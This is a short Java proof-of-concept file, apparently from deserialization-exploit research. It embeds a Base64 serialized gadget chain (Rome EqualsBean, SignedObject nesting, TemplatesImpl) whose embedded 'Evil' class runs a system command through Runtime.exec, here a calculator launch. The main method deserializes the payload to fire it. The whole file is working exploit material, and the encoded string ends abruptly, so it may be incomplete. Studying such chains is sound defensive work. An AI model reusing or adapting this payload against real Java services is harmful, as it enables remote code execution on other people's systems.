package SignedObject;

import java.util.Base64;
import static util.Tool.base64Decode;
import static util.Tool.deserialize;

public class ser {
    public static void main(String[] args) throws Exception {
        String payload  = "rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAACHcIAAAACwAAAAJzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAnQAAnl5c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHZyABpqYXZhLnNlY3VyaXR5LlNpZ25lZE9iamVjdAn/vWgqPNX/AgADWwAHY29udGVudHQAAltCWwAJc2lnbmF0dXJlcQB+AApMAAx0aGVhbGdvcml0aG10ABJMamF2YS9sYW5nL1N0cmluZzt4cHNxAH4ACXVyAAJbQqzzF/gGCFTgAgAAeHAAAAR6rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAACHcIAAAACwAAAAJzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAnQAAnl5c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAHEyv66vgAAADMAHwEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQARamF2YS9sYW5nL1J1bnRpbWUHAAgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAKAAsKAAkADAEAEGphdmEvbGFuZy9TdHJpbmcHAA4BAAdjbWQuZXhlCAAQAQACLWMIABIBAAltYXRlLWNhbGMIABQBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAFgAXCgAJABgBAAY8aW5pdD4MABoABgoABAAbAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAnAAUAAAAAABu4AA0GvQAPWQMSEVNZBBITU1kFEhVTtgAZV7EAAAAAAAEAGgAGAAEABwAAABEAAQABAAAABSq3AByxAAAAAAABAB0AAAACAB5wdAAFUG9yaWFwdwEAeHQAAnpacQB+ABB4dAABMXNxAH4AAj9AAAAAAAAMdwgAAAAQAAAAAnEAfgAWcQB+AAhxAH4ABHEAfgAQeHQAATJ4dXEAfgAOAAAALjAsAhQNVn8vb9klpVQllcEL35UWWV70GQIUSnzo3daFPKvno/Pt+VSReaf5bfB0AANEU0F0AAJ6WnEAfgANeHQAATFzcQB+AAI/QAAAAAAADHcIAAAAEAAAAAJxAH4AEnEAfgAIcQB";

        deserialize(base64Decode(payload));
    }
}
